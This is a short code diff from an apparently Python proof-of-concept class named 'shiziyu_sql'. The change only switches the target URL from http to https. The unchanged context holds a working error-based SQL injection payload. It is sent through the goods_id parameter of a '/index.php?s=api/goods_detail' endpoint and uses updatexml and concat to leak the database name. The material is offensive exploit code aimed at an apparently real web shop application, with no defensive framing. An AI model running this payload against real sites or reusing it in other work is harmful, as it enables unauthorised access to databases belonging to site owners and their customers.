@@ -9,7 +9,7 @@ class shiziyu_sql:
     def POC(url):
         urllib3.disable_warnings()  # 忽略https证书告警
         vunl_path = "/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)"
-        target_url = "http://"+ url + vunl_path
+        target_url = "https://"+ url + vunl_path
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
         }
